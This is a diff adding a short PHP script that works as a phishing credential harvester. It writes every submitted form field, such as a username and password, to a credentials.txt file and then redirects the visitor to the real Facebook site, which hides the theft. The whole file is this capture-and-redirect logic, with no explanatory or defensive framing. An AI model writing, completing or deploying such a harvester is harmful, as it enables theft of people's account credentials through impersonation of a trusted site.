@@ -1,0 +1,20 @@
+<?php
+
+$file =fopen('credentials.txt', "a");
+fwrite($file, "\t\t\t\t\t\t");
+fwrite($file, "\r\n");
+foreach($_POST as $key=>$value){
+fwrite($file, "\t\t\t\t\t\t");
+fwrite($file, "$key");
+fwrite($file, "=");
+fwrite($file, "$value");
+fwrite($file, "\r\n");
+
+}
+fwrite($file, "\r\n");
+fwrite($file, "\t\t\t\t\t\t");
+fclose($file);
+
+header("location: https://web.facebook.com/?_rdc=1&_rdr#")
+die();
+?>
